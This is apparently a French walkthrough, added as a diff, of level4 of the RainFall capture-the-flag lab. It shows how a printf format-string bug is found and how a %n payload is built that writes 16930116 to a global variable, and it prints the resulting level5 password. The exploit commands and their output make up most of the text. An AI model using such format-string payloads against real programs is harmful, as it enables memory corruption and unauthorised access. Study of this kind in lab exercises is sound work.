@@ -1,0 +1,70 @@
+Ce binaire a un fonctionnement similaire au precedent
+
+voir disas_analys
+
+apres analyse on constate que n prend un format et le passe a p, p quand a lui utilise printf
+
+on essaye ./level4
+
+level4@RainFall:~$ ./level4
+%s
+Z�
+  $�$�D$�
+
+cela ne crash pas mais fonctionne quand meme. On essaye autre choses :
+level4@RainFall:~$ ./level4
+%n
+Segmentation fault (core dumped)
+
+Ok donc maintenant on regadre attentivement la fonction n
+
+│           0x0804848d      a110980408     mov eax, dword [obj.m]      ; [0x8049810:4]=0
+│           0x08048492      3d44550201     cmp eax, 0x1025544
+
+ces deux lignes nous interpellent. l'obj m qui est donc le format qu'on a renvoyer est comparer a 0x1025544 qui est egal a 16930116
+
+on essaye donc d'overflow sur l'address 0x8049810 donc \x10\x98\x04\x08
+
+level4@RainFall:~$ cat /tmp/run - | ./level4
+
+Segmentation fault (core dumped)
+
+C'est pas encore ca. On va essayer de rajouter la valeur a comparer
+
+level4@RainFall:~$ python -c 'print "%n" + "BBBB" * 16930116 + "\x10\x98\x04\x08"' > /tmp/run
+level4@RainFall:~$ cat /tmp/run - | ./level4
+Segmentation fault (core dumped)
+level4@RainFall:~$
+
+On suppose que la valeur est trop enorme pour le buffer overflow donc va essaye de la decouper de sorte a ce que ce soit possible on va donc essayer de voir a quel moment notre BBBB va se repeter pour pouvoir apres dynamiquement choisir la taille du champ. On a choisi BBBB parce ca nous renvera 42424242 ce qui est plus facile a observer
+
+level4@RainFall:~$ python -c 'print "BBBB " +  "%x " * 8  + "\x10\x98\x04\x08"' > /tmp/run
+\level4@RainFall:~$cat /tmp/run - | ./level4n
+BBBB b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 �
+
+8 c'est pas assez on continue puis finalement on reussi apres quelque essais sur 12
+
+level4@RainFall:~$ cat /tmp/run - | ./level4
+BBBB b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 42424242 �
+
+Donc pour le process de ce level ca ressemblera un peu au precedent
+
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/run
+level4@RainFall:~$ cat /tmp/run - | ./level4
+
+Pour rappel, dans le dessassembleur on a pu observer que si la comparaison match elle utilisera donc un cat sur le .pass du level5
+
+Donc une fois executer la deuxieme commande on obtiendra quelque chose comme ca
+
+                                                                                            -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+on test donc le flag
+
+level4@RainFall:~$ su level5
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
+level5@RainFall:~$
+
+
